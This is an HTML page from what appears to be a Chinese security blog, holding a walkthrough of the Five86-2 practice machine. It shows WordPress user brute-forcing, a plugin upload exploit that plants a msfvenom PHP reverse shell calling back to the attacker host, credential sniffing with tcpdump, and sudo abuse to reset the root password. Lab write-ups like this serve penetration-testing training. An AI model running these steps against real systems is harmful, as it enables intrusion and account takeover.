@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="author" content="magisec网络安全博客" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  
+  <title>Five86-2   | magisec网络安全博客</title>
+
+  
+    <link rel="apple-touch-icon" href="https://ae01.alicdn.com/kf/U8f9a193ee8f04b09b08b3d8ceedb159d2.jpg">
+    <link rel="icon" href="https://ae01.alicdn.com/kf/U8f9a193ee8f04b09b08b3d8ceedb159d2.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="https://ae01.alicdn.com/kf/U8f9a193ee8f04b09b08b3d8ceedb159d2.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Dmagic</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Five86-2</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2020-12-29
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.105</p>
+<p>靶机IP：192.168.56.126</p>
+<p>修改一下hosts</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa7e493efa" alt="image-20201227173553346"></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- -oA five86-2 192.168.56.126</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa7ea31e0f" alt="image-20201227155746174"></p>
+<p>开放20 21 80</p>
+<p>20 21 ftp</p>
+<p>80 web</p>
+<h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>firefox打开</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;192.168.56.126</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa7f09b846" alt="image-20201227155912778"></p>
+<h3 id="whatweb识别cms"><a href="#whatweb识别cms" class="headerlink" title="whatweb识别cms"></a>whatweb识别cms</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http:&#x2F;&#x2F;192.168.56.126</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa7f5d5c9d" alt="image-20201227172333409"></p>
+<h3 id="gobuster扫描目录"><a href="#gobuster扫描目录" class="headerlink" title="gobuster扫描目录"></a>gobuster扫描目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -t 50 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt -e -l -u http:&#x2F;&#x2F;192.168.56.126 -o dir.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa7fb6ddf0" alt="image-20201227172430195"></p>
+<p>有效信息：wp-admin 后台</p>
+<h3 id="wpscan检测web站点"><a href="#wpscan检测web站点" class="headerlink" title="wpscan检测web站点"></a>wpscan检测web站点</h3><p>wpscan枚举用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.56.126 -e</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa8011ca57" alt="image-20201227172626619"></p>
+<p>wpscan暴力破解用户名，这里我尝试破解了admin，但是破解了很久也没有破解出来，于是放弃，试了其他用户也都破解不出来。barney和stephen一会就破解出来了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.56.126 --usernames barney -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.56.126 --usernames stephen -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa80738967" alt="image-20201227173213091"></p>
+<p><img src="https://img.rruu.net/image/5feaa80d46807" alt="image-20201227183213795"></p>
+<h3 id="wordpress后台getshell"><a href="#wordpress后台getshell" class="headerlink" title="wordpress后台getshell"></a>wordpress后台getshell</h3><h4 id="searchsploit搜索漏洞"><a href="#searchsploit搜索漏洞" class="headerlink" title="searchsploit搜索漏洞"></a>searchsploit搜索漏洞</h4><p>查看后台，未发现能使用常规的wpgetshell方法。我们使用插件getshell，首先查看有什么插件。需要学习常规wordpress后台获取shell的方法请查看这里：<a target="_blank" rel="noopener" href="https://www.hacknos.com/wordpress-shell-upload/">https://www.hacknos.com/wordpress-shell-upload/</a></p>
+<p><img src="https://img.rruu.net/image/5feaa8133fb6e" alt="image-20201227175404908"></p>
+<p>搜索相关插件，其中搜索第一个的时候是不可以利用的。具体原因，自己查看php文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Insert or</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa818344c1" alt="image-20201227175326007"></p>
+<p>这里我们找到一个远程代码执行的漏洞</p>
+<p><img src="https://img.rruu.net/image/5feaa81ef3ee9" alt="image-20201227180156547"></p>
+<p>我们调用出来，查看一下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit php&#x2F;webapps&#x2F;46981.txt -m</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa8245cdaf" alt="image-20201227180236104"></p>
+<p>查看使用说明，大概意思是说创建压缩包，里面放一个shell.php 然后找到创建一个文章，然后上传zip。这里给了一个视频地址，有兴趣的自己去看一下。 <a target="_blank" rel="noopener" href="https://youtu.be/knst26fEGCw?t=44">https://youtu.be/knst26fEGCw?t=44</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 46981.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa82918f76" alt="image-20201227180308478"></p>
+<h4 id="利用插件getshell"><a href="#利用插件getshell" class="headerlink" title="利用插件getshell"></a>利用插件getshell</h4><p>msf生成shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.56.105 LPORT&#x3D;9000 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa82ecb2dd" alt="image-20201227180741335"></p>
+<p>创建压缩包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip magisec.zip index.html shell.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa83376cc4" alt="image-20201227180757086"></p>
+<p>新建一个文章，点击e-learning</p>
+<p><img src="https://img.rruu.net/image/5feaa8387e337" alt="image-20201227181009002"></p>
+<p>选择upload</p>
+<p><img src="https://img.rruu.net/image/5feaa83d47ce4" alt="image-20201227181030129"></p>
+<p>点击上传，然后选择iframe框架</p>
+<p><img src="https://img.rruu.net/image/5feaa8418f800" alt="image-20201227181119258"></p>
+<p>返回一串地址</p>
+<p><img src="https://img.rruu.net/image/5feaa8465098a" alt="image-20201227181144122"></p>
+<p>配置msf监听会话</p>
+<p><img src="https://img.rruu.net/image/5feaa84ad880c" alt="image-20201227181209780"></p>
+<p>访问地址，即可反弹shell回来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;five86-2&#x2F;wp-content&#x2F;uploads&#x2F;articulate_uploads&#x2F;magisec&#x2F;shell.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa84fe62b1" alt="image-20201227181317744"></p>
+<h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><p>收集用户密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat wp-config.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa85488fe3" alt="image-20201227181435057"></p>
+<h3 id="python3切换bash"><a href="#python3切换bash" class="headerlink" title="python3切换bash"></a>python3切换bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa859e2782" alt="image-20201227181618686"></p>
+<p>su切换用户，尝试了barney，失败了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su stephen</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa85e8c1cd" alt="image-20201227183019614"></p>
+<h4 id="使用tcpdump检查密码"><a href="#使用tcpdump检查密码" class="headerlink" title="使用tcpdump检查密码"></a>使用tcpdump检查密码</h4><p>id为pcap，我们检查一下网卡。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip add</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa86389948" alt="image-20201227184312305"></p>
+<p>使用tcpdump监听，这里我没有截图。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i veth8616dc6 -w node.pcap</span><br></pre></td></tr></table></figure>
+<p>使用tcpdump查看node.pcap。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -r node.pcap</span><br></pre></td></tr></table></figure>
+<p>发现敏感信息</p>
+<p><img src="https://img.rruu.net/image/5feaa8691ffac" alt="image-20201227184502215"></p>
+<p>su切换用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su paul</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa86ea4cba" alt="image-20201227184610654"></p>
+<h4 id="service切换peter-bash"><a href="#service切换peter-bash" class="headerlink" title="service切换peter bash"></a>service切换peter bash</h4><p>查看sudo配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa872d02ef" alt="image-20201227184650652"></p>
+<p>发现可以切换到peter用户，我们使用service切换shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u peter service ..&#x2F;..&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa877a1470" alt="image-20201227184954048"></p>
+<p>查看peter用户的sudo配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa87d4ff40" alt="image-20201227185108526"></p>
+<h4 id="sudo权限passwd提权"><a href="#sudo权限passwd提权" class="headerlink" title="sudo权限passwd提权"></a>sudo权限passwd提权</h4><p>使用passwd重置root密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa881e58aa" alt="image-20201227185137596"></p>
+<p>切换root用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa88621659" alt="image-20201227185202443"></p>
+<h4 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;thisistheflag.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5feaa88a88415" alt="image-20201227185253742"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2020/12/28/Five86-1/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2020-12-29
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2020/12/29/Hackme2/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div class="post-catalog" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%83%85%E5%86%B5"><span class="toc-text">环境情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3"><span class="toc-text">nmap扫描端口</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F"><span class="toc-text">80端口渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#whatweb%E8%AF%86%E5%88%ABcms"><span class="toc-text">whatweb识别cms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gobuster%E6%89%AB%E6%8F%8F%E7%9B%AE%E5%BD%95"><span class="toc-text">gobuster扫描目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wpscan%E6%A3%80%E6%B5%8Bweb%E7%AB%99%E7%82%B9"><span class="toc-text">wpscan检测web站点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wordpress%E5%90%8E%E5%8F%B0getshell"><span class="toc-text">wordpress后台getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#searchsploit%E6%90%9C%E7%B4%A2%E6%BC%8F%E6%B4%9E"><span class="toc-text">searchsploit搜索漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%8F%92%E4%BB%B6getshell"><span class="toc-text">利用插件getshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87"><span class="toc-text">特权提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#python3%E5%88%87%E6%8D%A2bash"><span class="toc-text">python3切换bash</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8tcpdump%E6%A3%80%E6%9F%A5%E5%AF%86%E7%A0%81"><span class="toc-text">使用tcpdump检查密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#service%E5%88%87%E6%8D%A2peter-bash"><span class="toc-text">service切换peter bash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sudo%E6%9D%83%E9%99%90passwd%E6%8F%90%E6%9D%83"><span class="toc-text">sudo权限passwd提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96flag"><span class="toc-text">获取flag</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/magisec/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="2933653699@qq.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" href="Dmagic_hk">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      <a href="">Copyright © magisec 2021</a>
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+      
+  <div class="search-icon" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+    </div>
+  </body>
+</html>
